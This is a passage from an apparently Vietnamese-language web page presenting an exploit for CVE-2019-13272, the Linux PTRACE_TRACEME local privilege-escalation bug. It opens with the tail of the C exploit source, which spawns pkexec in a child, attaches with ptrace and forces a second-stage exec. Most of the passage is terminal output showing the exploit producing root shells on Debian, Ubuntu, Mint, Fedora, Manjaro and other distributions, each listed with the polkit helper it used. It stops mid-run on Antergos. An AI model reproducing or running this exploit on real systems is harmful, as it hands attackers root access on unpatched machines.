</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>block_pipe</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>dummy</span><span class=p>,</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* spawn pkexec in a child, and continue here once our child is in execve() */</span>
</span></span><span class=line><span class=cl>  <span class=k>static</span> <span class=kt>char</span> <span class=n>middle_stack</span><span class=p>[</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>pid_t</span> <span class=n>midpid</span> <span class=o>=</span> <span class=n>SAFE</span><span class=p>(</span><span class=n>clone</span><span class=p>(</span><span class=n>middle_main</span><span class=p>,</span> <span class=n>middle_stack</span><span class=o>+</span><span class=k>sizeof</span><span class=p>(</span><span class=n>middle_stack</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                            <span class=n>CLONE_VM</span><span class=o>|</span><span class=n>CLONE_VFORK</span><span class=o>|</span><span class=n>SIGCHLD</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>middle_success</span><span class=p>)</span> <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   * wait for our child to go through both execve() calls (first pkexec, then
</span></span></span><span class=line><span class=cl><span class=cm>   * the executable permitted by polkit policy).
</span></span></span><span class=line><span class=cl><span class=cm>   */</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>tprintf</span><span class=p>(</span><span class=s>&#34;/proc/%d/comm&#34;</span><span class=p>,</span> <span class=n>midpid</span><span class=p>),</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>buflen</span> <span class=o>=</span> <span class=n>SAFE</span><span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=p>[</span><span class=n>buflen</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>strchrnul</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=sc>&#39;\n&#39;</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>strncmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>basename</span><span class=p>(</span><span class=n>helper_path</span><span class=p>),</span> <span class=mi>15</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>usleep</span><span class=p>(</span><span class=mi>100000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   * our child should have gone through both the privileged execve() and the
</span></span></span><span class=line><span class=cl><span class=cm>   * following execve() here
</span></span></span><span class=line><span class=cl><span class=cm>   */</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>ptrace</span><span class=p>(</span><span class=n>PTRACE_ATTACH</span><span class=p>,</span> <span class=n>midpid</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>SAFE</span><span class=p>(</span><span class=n>waitpid</span><span class=p>(</span><span class=n>midpid</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dummy_status</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>fputs</span><span class=p>(</span><span class=s>&#34;attached to midpid</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>force_exec_and_wait</span><span class=p>(</span><span class=n>midpid</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;stage2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=kết-quả>Kết quả<a hidden class=anchor aria-hidden=true href=#kết-quả>#</a></h3><h3 id=debian>Debian<a hidden class=anchor aria-hidden=true href=#debian>#</a></h3><h4 id=debian-10-xfce>Debian 10 (xfce)<a hidden class=anchor aria-hidden=true href=#debian-10-xfce>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/lib/gnome-settings-daemon/gsd-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@debian-10-0-0-x64:~/Desktop/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>root@debian-10-0-0-x64:/home/user/Desktop/47133# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,109<span class=o>(</span>netdev<span class=o>)</span>,112<span class=o>(</span>bluetooth<span class=o>)</span>,116<span class=o>(</span>lpadmin<span class=o>)</span>,117<span class=o>(</span>scanner<span class=o>)</span>,1000<span class=o>(</span>user<span class=o>)</span>
</span></span><span class=line><span class=cl>root@debian-10-0-0-x64:/home/user/Desktop/47133# 
</span></span></code></pre></td></tr></table></div></div><h4 id=debian-94-xfce>Debian 9.4 (xfce)<a hidden class=anchor aria-hidden=true href=#debian-94-xfce>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@debian9-4-0-x64:~/Desktop/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>root@debian9-4-0-x64:/home/user/Desktop/47133# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,108<span class=o>(</span>netdev<span class=o>)</span>,113<span class=o>(</span>lpadmin<span class=o>)</span>,117<span class=o>(</span>scanner<span class=o>)</span>,1000<span class=o>(</span>user<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=devuan-200-xfce>Devuan 2.0.0 (xfce)<a hidden class=anchor aria-hidden=true href=#devuan-200-xfce>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@devuan-2-0-0:~/Desktop/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>root@devuan-2-0-0:/home/user/Desktop/47133#
</span></span></code></pre></td></tr></table></div></div><h4 id=sparkylinux-5-lxqt>SparkyLinux 5 (lxqt)<a hidden class=anchor aria-hidden=true href=#sparkylinux-5-lxqt>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/bin/lxqt-backlight_backend
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@sparkylinux-5-x64:~/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>root@sparkylinux-5-x64:/home/user/47133# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,20<span class=o>(</span>dialout<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,27<span class=o>(</span>sudo<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,100<span class=o>(</span>users<span class=o>)</span>,104<span class=o>(</span>scanner<span class=o>)</span>,107<span class=o>(</span>lpadmin<span class=o>)</span>,113<span class=o>(</span>netdev<span class=o>)</span>,114<span class=o>(</span>bluetooth<span class=o>)</span>,1000<span class=o>(</span>user<span class=o>)</span>
</span></span><span class=line><span class=cl>root@sparkylinux-5-x64:/home/user/47133#
</span></span></code></pre></td></tr></table></div></div><h3 id=ubuntu>Ubuntu<a hidden class=anchor aria-hidden=true href=#ubuntu>#</a></h3><h4 id=ubuntuubuntu-16045-unity>UbuntuUbuntu 16.04.5 (unity)<a hidden class=anchor aria-hidden=true href=#ubuntuubuntu-16045-unity>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/lib/unity-settings-daemon/usd-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@ubuntu-16-04-5-x64:~/Desktop/kernel-exploits/CVE-2019-13272$ ./a.out 
</span></span><span class=line><span class=cl>Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME <span class=nb>local</span> root <span class=o>(</span>CVE-2019-13272<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Checking environment ...
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Done, looks good
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Searching <span class=k>for</span> known helpers ...
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Found known helper: /usr/lib/unity-settings-daemon/usd-backlight-helper
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Using helper: /usr/lib/unity-settings-daemon/usd-backlight-helper
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Spawning suid process <span class=o>(</span>/usr/bin/pkexec<span class=o>)</span> ...
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Tracing midpid ...
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Attached to midpid
</span></span><span class=line><span class=cl>To run a <span class=nb>command</span> as administrator <span class=o>(</span>user <span class=s2>&#34;root&#34;</span><span class=o>)</span>, use <span class=s2>&#34;sudo &lt;command&gt;&#34;</span>.
</span></span><span class=line><span class=cl>See <span class=s2>&#34;man sudo_root&#34;</span> <span class=k>for</span> details.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@ubuntu-16-04-5-x64:/home/user/Desktop/kernel-exploits/CVE-2019-13272# 
</span></span></code></pre></td></tr></table></div></div><h4 id=ubuntu-1804-gnome>Ubuntu 18.04 (gnome)<a hidden class=anchor aria-hidden=true href=#ubuntu-1804-gnome>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/lib/gnome-settings-daemon/gsd-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@ubuntu:~/Desktop/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>To run a <span class=nb>command</span> as administrator <span class=o>(</span>user <span class=s2>&#34;root&#34;</span><span class=o>)</span>, use <span class=s2>&#34;sudo &lt;command&gt;&#34;</span>.
</span></span><span class=line><span class=cl>See <span class=s2>&#34;man sudo_root&#34;</span> <span class=k>for</span> details.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@ubuntu:/home/user/Desktop/47133# 
</span></span></code></pre></td></tr></table></div></div><h4 id=ubuntu-1904-gnome>Ubuntu 19.04 (gnome)<a hidden class=anchor aria-hidden=true href=#ubuntu-1904-gnome>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/lib/gnome-settings-daemon/gsd-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@ubuntu-19-04-x64:~/Desktop/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>To run a <span class=nb>command</span> as administrator <span class=o>(</span>user <span class=s2>&#34;root&#34;</span><span class=o>)</span>, use <span class=s2>&#34;sudo &lt;command&gt;&#34;</span>.
</span></span><span class=line><span class=cl>See <span class=s2>&#34;man sudo_root&#34;</span> <span class=k>for</span> details.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@ubuntu-19-04-x64:/home/user/Desktop/47133# 
</span></span></code></pre></td></tr></table></div></div><h4 id=ubuntu-mate-1904-mate>Ubuntu Mate 19.04 (mate)<a hidden class=anchor aria-hidden=true href=#ubuntu-mate-1904-mate>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/sbin/mate-power-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@ubuntu-mate-19-04-desktop-amd64:~/Desktop/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>To run a <span class=nb>command</span> as administrator <span class=o>(</span>user <span class=s2>&#34;root&#34;</span><span class=o>)</span>, use <span class=s2>&#34;sudo &lt;command&gt;&#34;</span>.
</span></span><span class=line><span class=cl>See <span class=s2>&#34;man sudo_root&#34;</span> <span class=k>for</span> details.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@ubuntu-mate-19-04-desktop-amd64:/home/user/Desktop/47133# 
</span></span></code></pre></td></tr></table></div></div><h4 id=linux-mint-19-v2-mate>Linux Mint 19-v2 (mate)<a hidden class=anchor aria-hidden=true href=#linux-mint-19-v2-mate>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/sbin/mate-power-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@linux-mint-19-2:~/Desktop/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>To run a <span class=nb>command</span> as administrator <span class=o>(</span>user <span class=s2>&#34;root&#34;</span><span class=o>)</span>, use <span class=s2>&#34;sudo &lt;command&gt;&#34;</span>.
</span></span><span class=line><span class=cl>See <span class=s2>&#34;man sudo_root&#34;</span> <span class=k>for</span> details.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@linux-mint-19-2:/home/user/Desktop/47133# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,27<span class=o>(</span>sudo<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,115<span class=o>(</span>lpadmin<span class=o>)</span>,128<span class=o>(</span>sambashare<span class=o>)</span>,1000<span class=o>(</span>user<span class=o>)</span>
</span></span><span class=line><span class=cl>root@linux-mint-19-2:/home/user/Desktop/47133# 
</span></span></code></pre></td></tr></table></div></div><h4 id=elementary-os-041-gnome>Elementary OS 0.4.1 (gnome)<a hidden class=anchor aria-hidden=true href=#elementary-os-041-gnome>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/lib/gnome-settings-daemon/gsd-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@elementary-os-0-4-1-20170517:~/47133$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl>To run a <span class=nb>command</span> as administrator <span class=o>(</span>user <span class=s2>&#34;root&#34;</span><span class=o>)</span>, use <span class=s2>&#34;sudo &lt;command&gt;&#34;</span>.
</span></span><span class=line><span class=cl>See <span class=s2>&#34;man sudo_root&#34;</span> <span class=k>for</span> details.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@elementary-os-0-4-1-20170517:/home/user/47133# <span class=nb>exit</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=fedora--centos--rhel>Fedora / CentOS / RHEL<a hidden class=anchor aria-hidden=true href=#fedora--centos--rhel>#</a></h3><h4 id=fedora-30-workstation-gnome>Fedora 30 Workstation (gnome)<a hidden class=anchor aria-hidden=true href=#fedora-30-workstation-gnome>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/libexec/gsd-wacom-led-helper
</span></span><span class=line><span class=cl>/usr/libexec/gsd-wacom-oled-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>user@localhost CVE-2019-13272<span class=o>]</span>$ ./a.out 
</span></span><span class=line><span class=cl>Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME <span class=nb>local</span> root <span class=o>(</span>CVE-2019-13272<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Checking environment ...
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Done, looks good
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Searching <span class=k>for</span> known helpers ...
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Found known helper: /usr/libexec/gsd-wacom-led-helper
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Spawning pkexec ...
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Tracing midpid ...
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Attached to midpid
</span></span><span class=line><span class=cl><span class=o>[</span>root@localhost CVE-2019-13272<span class=o>]</span><span class=c1># id</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,10<span class=o>(</span>wheel<span class=o>)</span>,1000<span class=o>(</span>user<span class=o>)</span> <span class=nv>context</span><span class=o>=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span></code></pre></td></tr></table></div></div><h3 id=arch>Arch<a hidden class=anchor aria-hidden=true href=#arch>#</a></h3><h4 id=manjaro-1803-xfce>Manjaro 18.0.3 (xfce)<a hidden class=anchor aria-hidden=true href=#manjaro-1803-xfce>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/bin/xfpm-power-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>user@manjaro-xfce-18-0-3-x86-64 47133<span class=o>]</span>$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl><span class=o>[</span>manjaro-xfce-18-0-3-x86-64 47133<span class=o>]</span><span class=c1># </span>
</span></span></code></pre></td></tr></table></div></div><h4 id=mageia-6-gnome>Mageia 6 (gnome)<a hidden class=anchor aria-hidden=true href=#mageia-6-gnome>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/libexec/gsd-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>user@localhost 47133<span class=o>]</span>$ ./a.out 
</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl><span class=o>[</span>root@localhost 47133<span class=o>]</span><span class=c1>#</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=antergos-187-gnome>Antergos 18.7 (gnome)<a hidden class=anchor aria-hidden=true href=#antergos-187-gnome>#</a></h4><p>Antergos was recently EOL (last release 2019-04-04)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/usr/lib/gsd-wacom-oled-helper
</span></span><span class=line><span class=cl>/usr/lib/gsd-backlight-helper
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>user@antergos 47133<span class=o>]</span>$ ./a.out 
